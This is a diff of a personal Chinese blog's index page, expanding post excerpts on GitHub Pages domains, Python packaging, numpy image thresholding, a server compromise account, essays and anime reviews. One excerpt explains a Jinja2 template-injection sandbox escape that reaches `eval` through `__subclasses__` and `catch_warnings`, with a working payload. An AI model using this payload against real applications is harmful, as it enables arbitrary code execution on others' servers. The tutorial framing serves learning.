@@ -70,7 +70,24 @@
 <p>之后， 在 DNS advance 上面增加一条CNAME记录， 如果要使用<code>blog.xxx.com</code>那么 <code>host</code> 的值填 <code>blog</code>而不是<code>blog.xxx.com</code>， value 填<code>xxx.github.io</code>  </p>
 </li>
 <li>
-<p>如果你的 github page 是一个不断更新的博客， 必须在渲染时增加 CNAME 记录。  我是用的是 pelican， 设置方法是在<code>pelicanconf ...</code></p></li></ul>
+<p>如果你的 github page 是一个不断更新的博客， 必须在渲染时增加 CNAME 记录。  我是用的是 pelican， 设置方法是在<code>pelicanconf.py</code> 中设置</p>
+</li>
+</ul>
+<div class="highlight"><pre><span></span><span class="n">EXTRA_PATH_METADATA</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s1">&#39;static/CNAME&#39;</span><span class="p">:{</span><span class="s1">&#39;path&#39;</span><span class="p">:</span><span class="s1">&#39;CNAME&#39;</span><span class="p">},</span>
+<span class="p">}</span>
+
+<span class="n">STATIC_PATHS</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;images&#39;</span><span class="p">,</span> 
+                <span class="s1">&#39;static&#39;</span><span class="p">]</span>
+</pre></div>
+
+
+<p>之后就是等待 dns 的刷新了</p>
+<h3 id="_1"><a name="user-content-_1" href="#_1" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>小结</h3>
+<p>CNAME 设置是 <code>blog</code>， 而不<code>blog.xxx.com</code>, 不然域名会解析到<code>blog.xxx.com.xxx.com</code></p>
+<p>另外， pelican 默认只听是 googleapi 上面的， 虽然据说可能大概好像也许， 在北京有服务器， 但是我这里还是很慢， 于是我把字体的 url 改成了中科大的。  </p>
+<p>方法：<br />
+在主题里的 ...</p>
       <a class="btn" href="http://littlezz.github.io/github-page-zi-ding-yi-zi-yu-ming.html#github-page-zi-ding-yi-zi-yu-ming">Continue reading</a>
   </div>
   <hr />
@@ -101,7 +118,24 @@
 <div class="highlight"><pre><span></span><span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span>
 
 <span class="k">print</span><span class="p">([]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">0</span><span class="p">])</span>
-<span class="c1">#output type ...</span></pre></div>
+<span class="c1">#output type</span>
+</pre></div>
+
+
+<p>之后利用其中的 <code>catch_warnings</code> 访问 globals 定位出 <code>eval</code>， 然后进行任意代码执行。</p>
+<div class="highlight"><pre><span></span><span class="c1">#python3 </span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">146</span><span class="p">]:</span> <span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">166</span><span class="p">]</span>
+<span class="n">Out</span><span class="p">[</span><span class="mi">146</span><span class="p">]:</span> <span class="n">warnings</span><span class="o">.</span><span class="n">catch_warnings</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">153</span><span class="p">]:</span> <span class="n">Template</span><span class="p">(</span><span class="s1">&#39;{{[].__class__.__base__.__subclasses__()[166].__init__.__g</span>
+     <span class="o">...</span><span class="p">:</span> <span class="n">lobals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">eval</span><span class="p">(</span><span class="s2">&quot;1+1&quot;</span><span class="p">)}}</span><span class="s1">&#39;).render()</span>
+<span class="n">Out</span><span class="p">[</span><span class="mi">153</span><span class="p">]:</span> <span class="s1">&#39;2&#39;</span>
+</pre></div>
+
+
+<h3 id="_1"><a name="user-content-_1" href="#_1" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>绕过引号</h3>
+<p>一般情况下， <code>%</code>会被过滤， 但是如果引号也被过滤的话怎么构造出 ...</p>
       <a class="btn" href="http://littlezz.github.io/jinja2-mo-ban-zhu-ru-rao-guo-yin-hao-ren-yi-dai-ma-zhi-xing.html#jinja2-mo-ban-zhu-ru-rao-guo-yin-hao-ren-yi-dai-ma-zhi-xing">Continue reading</a>
   </div>
   <hr />
@@ -126,7 +160,20 @@
 <p>MANIFEST.in文件是针对 源文件打包 的， 当需要把非程序文件， 包括README， css或者test文件等加入时， 在MANIFEST.in中指定， 用于生成MANIFEST</p>
 <p>MIANIFEST会暗中自动寻找以下的文件：  </p>
 <ul>
-<li>所有<code>py_modules</code> 和 <code>packages ...</code></li></ul>
+<li>所有<code>py_modules</code> 和 <code>packages</code>中没有明确说明的python文件 </li>
+<li>ext_modules 或 libraries选项中指明的C文件</li>
+<li><code>scripts</code>指明的文件</li>
+<li>所有看上去像是test文件的， 比如<code>tests/*.py</code></li>
+<li>README.txt 或者 README, setup.py, setup.cfg</li>
+<li><code>package_data</code>中指明的文件</li>
+<li><code>data_files</code>中指明的文件</li>
+</ul>
+<h2 id="package_data"><a name="user-content-package_data" href="#package_data" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>package_data</h2>
+<p><code>package_data</code>是在setup.py中的参数， 用于控制安装包里面包含的文件。<br />
+应该这样理解， MANIFEST 控制 sdist 包含的内容， package_data控制bdist包含的内容。  </p>
+<p>一般情况是， 对源文件打包里面一般包含README， tests这些， 但是对于安装包这不需要。  所以分开设置。  </p>
+<h2 id="include_package_data"><a name="user-content-include_package_data" href="#include_package_data" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>include_package_data</h2>
+<p>坑就是指 ...</p>
       <a class="btn" href="http://littlezz.github.io/pythonda-bao-shi-tian-jia-fei-dai-ma-wen-jian-de-keng.html#pythonda-bao-shi-tian-jia-fei-dai-ma-wen-jian-de-keng">Continue reading</a>
   </div>
   <hr />
@@ -146,7 +193,17 @@
 <h2 id="_2"><a name="user-content-_2" href="#_2" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>算法</h2>
 <p>首先， 介绍一下 Adaptive Thresholding Using the Integral Image 这篇论文， 论文很简单， 对一个点周围的一片区域取平均值， 如果该点低于平均值的85%， 就设为黑， 否则为白色。 论文主要是用累积和来改进取一片区域平均值的速度。 <br />
 过程为水平方向做一次累积和， 垂直方向做一次累积和， 这样每一个点就表示其左上角的区域的和， 于是要计算一个矩形（a, b, c, d), 其区域上的和就是 d - b -c + a. <br />
-原始的扫描区域的每一个点求和， 时间是O(n * n * boxsize ...</p>
+原始的扫描区域的每一个点求和， 时间是O(n * n * boxsize * boxsize)， 现在变成了常数时间。  </p>
+<h2 id="_3"><a name="user-content-_3" href="#_3" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>直观实现</h2>
+<p>首先我们直接照着原理实现，理论是最快的<br />
+（然而实际是最慢的） </p>
+<p><div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">intuitive_method</span><span class="p">(</span><span class="n">mat</span><span class="p">,</span> <span class="n">w</span><span class="p">,</span> <span class="n">h</span> <span class="p">,</span> <span class="n">set_value</span><span class="p">,</span> <span class="n">threshold</span><span class="p">,</span> <span class="n">boxsize</span><span class="p">):</span>
+    <span class="n">mat</span> <span class="o">=</span> <span class="n">mat</span><span class="o">.</span><span class="n">T</span>
+    <span class="n">integral_map</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros_like</span><span class="p">(</span><span class="n">mat</span><span class="p">,</span> <span class="n">dtype</span><span class="o">=</span><span class="nb">int</span><span class="p">)</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros_like</span><span class="p">(</span><span class="n">mat</span><span class="p">,</span> <span class="n">dtype</span><span class="o">=</span><span class="nb">int</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">w</span><span class="p">):</span>
+        <span class="n">csum</span><span class="o">=</span><span class="mi">0</span>
+        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range ...</span></pre></div></p>
       <a class="btn" href="http://littlezz.github.io/dui-numpyde-yi-xi-lie-shi-yan.html#dui-numpyde-yi-xi-lie-shi-yan">Continue reading</a>
   </div>
   <hr />
@@ -175,7 +232,15 @@
 
 <p>反查这些ip， 发现都不是我们自己的ip。<br />
 我估计是被爆破了， 但是我端口用的是443， 所以也不太好确定是不是真的被爆破。<br />
-之后就是ban ...</p>
+之后就是ban ip， 换端口， 改密码。  </p>
+<p>接着开始考虑服务器本身有没有被攻破， 看了一下ssh的22端口， 发现有其他的ip在建立连接， 到这里我都没有特别慌张， 我想， 我还有fail2ban呢。  </p>
+<p>检查了一下我的fail2ban， 发现处于开启失败状态。<br />
+顺带， ssh服务没换端口， 允许root账号登录， 允许密码登录。</p>
+<p>『卧槽， 精彩了』  </p>
+<p>赶紧联系大腿。</p>
+<p>先打<code>w</code>命令， 一片空白， 一般登录了的话至少有自己一个人， 现在什么也没有， 六神表示<code>w</code>估计被改了， 可能是被rootkit了， rootkit了的话基本就很难看出其他的东西了。  </p>
+<p>往后是一些挣扎， 检查<code>ps -aux</code>， 看不出来。<br />
+检查<code>who -a /var/log/wtmp ...</code></p>
       <a class="btn" href="http://littlezz.github.io/ji-yi-ci-fu-wu-qi-bei-bao-po-hou-zai-hou-zhong-jian-ssde-jing-li.html#ji-yi-ci-fu-wu-qi-bei-bao-po-hou-zai-hou-zhong-jian-ssde-jing-li">Continue reading</a>
   </div>
   <hr />
@@ -194,7 +259,15 @@
 <p>最近在准备写一个即时聊天的网站来练手，前端用reactjs， 后端是aiohttp， 数据库mongodb，  主要是想体验一把分布式的Websocket 和Python3.5 的<code>await/async</code>语法的。但是按现在的进度看来要花大把的时间在前端上面了， 我一年前不知道为什么两个元素会上下排列， 一年后还是不知道为什么。  </p>
 <p>前端， 总是给我一种五五开的『这他妈是什么， 这他妈又是什么』的感觉。</p>
 <p>不久前写过一个chrome的插件<a href="https://github.com/littlezz/PixivFast">PixivFast</a>， 用来让我在p站刷图时可以不用点开大图之后再右键另存为， 而是按一下<code>s</code>就可以弹出下载大图的会话框。 实用， 但是没放到google商店上， 而且我还想着再加一个同时给10分评分的功能， 于是就一直拖着。目前有一名忠实的用户——我自己， 不过由于没有在google商店上面发布， 每次重启浏览器都得重新安装插件， 就现状看来， 这个『忠实』的用户也快叛变了。  </p>
-<p>还有一个备份A岛讨论串的爬虫， <a href="https://github.com/littlezz/island-backup">island-backup</a>, 用aiohttp写的。当初野心勃勃， 如今也只是剩下几个自己开的issue没关， kukuku岛禁用api接口之后我懒得再管, 于是现在只能用于主岛。甚至github上面代码到了v1 ...</p>
+<p>还有一个备份A岛讨论串的爬虫， <a href="https://github.com/littlezz/island-backup">island-backup</a>, 用aiohttp写的。当初野心勃勃， 如今也只是剩下几个自己开的issue没关， kukuku岛禁用api接口之后我懒得再管, 于是现在只能用于主岛。甚至github上面代码到了v1.1.2， 但是pypi上面还是停留在v1.0.1。<br />
+懒到不想打包。  </p>
+<p>其实api接口禁用之后解析html就好了， 懒。 我之前写过一个搜索出A岛回复数超过一定量的串的程序， 当时是有精力啊， 支持A岛， 哭哭哭岛， 备胎岛， 甚至是K岛， 里面有socks的代理设置， 而且还图形化了，用的是自带的tk。 然后呢？mac上面的tk有问题， 触摸板双指滑动tk就崩， 我自己的mac上面下载了新的tk， 没有问题，  后来兴致勃勃的跑去给蛋蛋试用， 他从github上克隆好程序装好所需的依赖， 启动之后双指一上滑， Duang！ </p>
+<p>我和他解释啊， 这不是我的锅啊， 这是tk的锅啊， tk的锅啊， 底层的锅啊， 我救不了啊。 </p>
+<p>你要不装个新的tk试试？ </p>
+<p>他给了我一个关爱智障的眼神。  </p>
+<p><img alt="" src="../images/2.jpg" />  </p>
+<p>这个项目后来也不了了之了， 我自己都不用。  </p>
+<p>后来还写了一个<a href="https://github.com/littlezz/ESL-Model">ESL-Model</a>, 这东西我都不想说， 现在都快成黑历史了 ...</p>
       <a class="btn" href="http://littlezz.github.io/lan.html#lan">Continue reading</a>
   </div>
   <hr />
@@ -217,7 +290,12 @@
 此时老师已经拿着扫描仪走到我旁边了， 我还没有找到对应的页数， 一把抽过邻座的书， 74页， 我看了一下自己的书， 第71页， 赶紧一翻， 老师也在这时走到了我身旁。  </p>
 <p>我希望他没有看到我空空如也的书本， 对他说先检查邻座的吧。  </p>
 <p>末了， 老师说时间不够了， 没有检查的同学下课了过去找他。我松了一口气， 赶紧对着邻座的书本抄， 题目是填写一个巨大且数目繁多的表格。  </p>
-<p>放学后走在回家的路上， 我带着耳机， 放着the pillows的《one life》，和一个女生并肩走着， 我低着头看我的脚抬起又落下 ...</p>
+<p>放学后走在回家的路上， 我带着耳机， 放着the pillows的《one life》，和一个女生并肩走着， 我低着头看我的脚抬起又落下， 配合着节拍， 正当我觉得风景正好， 晚霞染红了半片天， 心情舒畅， 斗志昂扬的时候， 我想起这样带着耳机和一个女孩走路不太礼貌， 继而我突然想到我忘记去给老师检查我的作业了。</p>
+<p>于是事情最终演变成了我摘下耳机， 停下了脚步， 在兴奋劲还没有散去的脸上新添了一份略带惶恐的表情：『完了， 我忘记给老师检查了， 平时分没有了。  』</p>
+<p>女孩或许说了些什么， 我没在听， 但是我才注意到我喜欢这个女孩， 但是他是不是我的女朋友呢， 好像也不是， 我们可能是在恋爱期吧。  </p>
+<p>我觉得没有什么比现在和女孩一起走在回家的路上更重要的了， 瞬间忘光了检查作业的事情， 毕竟， 现在回学校也没有什么用了。  </p>
+<p>到了一处池塘， 池塘旁边放满了五花八门的脸盆和塑料桶。 这个池塘里面有各种各样的鱼， 以黑色的草鱼为主。 一个无主的池塘， 鱼儿平时可能就吃一些水草吧， 所以鱼饵一下去， 立马咬钩， 但是钓上来的鱼却总是又肥又大， 池塘旁边的各式各样的盆和桶用于给垂钓者临时存放钓上来的鱼， 偶尔来得早了还能发现几根普通的『随手』杆。  总之， 一个免费且设施齐全的自助鱼塘。  </p>
+<p>我们商量着钓一条鱼回去， 取了一根鱼竿 ...</p>
       <a class="btn" href="http://littlezz.github.io/hui-jia.html#hui-jia">Continue reading</a>
   </div>
   <hr />
@@ -243,7 +321,17 @@
 </pre></div>
 
 
-<p>Secondly, add specify ...</p>
+<p>Secondly, add specify file to the root folder.  </p>
+<ul>
+<li>README.rst  </li>
+<li>MANIFEST.in  </li>
+<li>setup.py  </li>
+<li>setup.cfg(option)</li>
+</ul>
+<p>pypi do not know markdown format readme, there is only rst format available.</p>
+<h2 id="setuppy"><a name="user-content-setuppy" href="#setuppy" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>setup.py</h2>
+<p>look at<br />
+<a href="https://github.com/pypa/sampleproject/blob/master/setup.py">https://github.com/pypa/sampleproject/blob/master/setup.py ...</a></p>
       <a class="btn" href="http://littlezz.github.io/how-to-upload-package-to-pypi.html#how-to-upload-package-to-pypi">Continue reading</a>
   </div>
   <hr />
@@ -266,7 +354,20 @@
 基于看过纪录片的原因， 我先说32话， 之后的按顺序。  </p>
 <h3 id="32"><a name="user-content-32" href="#32" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>32 新世紀いんぱくつ。</h3>
 <p>和eva是同一个时间观的， 我特别去看了之前监督和林原惠意见冲突的地方， 讲道理， 其实还是林原惠说得对。。。<del>那张脸上面看不出所谓的成熟</del><br />
-然后歌很好听， 非常好听， 背景也非常美，再配上百合， 百合！百合！林原精分现场！自己和自己百合！！  我吼兴奋， 我吼兴奋啊啊啊啊啊啊啊啊啊啊wwww ...</p>
+然后歌很好听， 非常好听， 背景也非常美，再配上百合， 百合！百合！林原精分现场！自己和自己百合！！  我吼兴奋， 我吼兴奋啊啊啊啊啊啊啊啊啊啊wwww， 可以循环看好多遍。 <br />
+<del>我的偶像不可能变成橙汁</del>  </p>
+<h3 id="1"><a name="user-content-1" href="#1" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>1 龍の歯医者</h3>
+<p>恢弘大作的感觉， 嗯， BGM也很恢弘， 作画也很酷炫。  </p>
+<h3 id="2-hill-climb-girl"><a name="user-content-2-hill-climb-girl" href="#2-hill-climb-girl" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>2 HILL CLIMB GIRL</h3>
+<p>感觉上是秀3D技术的， 然而我觉得里面的歌曲很好听。  </p>
+<h3 id="3-mememe"><a name="user-content-3-mememe" href="#3-mememe" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>3 ME!ME!ME!</h3>
+<p>这个不用说了， 很多人说神作啦， 和EVA说的是一个事情啦， 更加容易懂啦， 实用啦。 各种各样。<br />
+想要补充的就是其实庵野是没有参与进来的。。。<br />
+蛮好看的， 值得一看。 卖肉新高度。而且很带感。有很多符号元素。 总之看得开心就是好的。 </p>
+<h3 id="4-carnage"><a name="user-content-4-carnage" href="#4-carnage" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>4 Carnage</h3>
+<p>和上一个作品形成鲜明的对比。 <br />
+这部作品非常有表现力。<br />
+《ME!ME!ME!》 的主题是美少女， 而这部作品的主题是表现故事 ...</p>
       <a class="btn" href="http://littlezz.github.io/ri-ben-dong-hua-ren-zhan-lan-hui-zong-jie-yu-tui-jian.html#ri-ben-dong-hua-ren-zhan-lan-hui-zong-jie-yu-tui-jian">Continue reading</a>
   </div>
   <hr />
@@ -289,7 +390,14 @@
 俨然一副资深人士的样子。  </p>
 <p>然而来来回回， 不还是局限在剧情方面？<br />
 一部动画， 构图， 分镜， 配音， 上色， 配乐等等， 这么多元素在里面， 最后大家却振振有词的依据剧情来打分， 还能说得头头是道。  </p>
-<p>我才明白当时的我也是如此， 也就是在那时， 我才会想起我起初看这个动画的时候的兴奋之情， 我大呼卧槽， 我呼啦一下打开房间的门， 我走到从来不看番的室友的房间， 我说 ...</p>
+<p>我才明白当时的我也是如此， 也就是在那时， 我才会想起我起初看这个动画的时候的兴奋之情， 我大呼卧槽， 我呼啦一下打开房间的门， 我走到从来不看番的室友的房间， 我说， 卧槽， 我要通宵看完这部番了， 我已经有几年没有这种想要通宵看番的冲动了， 上一次这样还是高中， 看得是石头门。<br />
+我在一集结束的时候， 高呼悠木碧， 棒啊啊啊啊。 我说， fuck them all！ 到后面， 我室友都跑过来我们两个熬夜看番了。  </p>
+<p>也就是那时， 我才会想起， 有多少回， 我被里面的一幕触动到， 我说， 就凭此刻， 足以封神。   </p>
+<p>所以我改成了9分， 为了我当初的承诺， 为了第二话那句『原来我也有过这样的时间啊』， 为了在记录那时感想时触动的回忆让我流着泪写完观后感。  </p>
+<p>如果此刻我还保持着一副正人君子， 道貌岸然， 满口胡言的扯着剧情的『公平之人』， 那我就是一个双料的傻瓜。  </p>
+<p>干他娘的， 我就是要给9分， 有傻逼打低分， 为什么我就不能打高分？  </p>
+<p>说到底， 为什么作品的排名会被高低分这种东西牵制。 或者说如何排除傻逼对一个作品的影响。  </p>
+<p>投票者投票表决天才， 但是有一个前提是 ...</p>
       <a class="btn" href="http://littlezz.github.io/guan-yu-wo-bu-zai-de-jie-dao-ping-fen-de-yi-dian-si-kao.html#guan-yu-wo-bu-zai-de-jie-dao-ping-fen-de-yi-dian-si-kao">Continue reading</a>
   </div>
 </article>
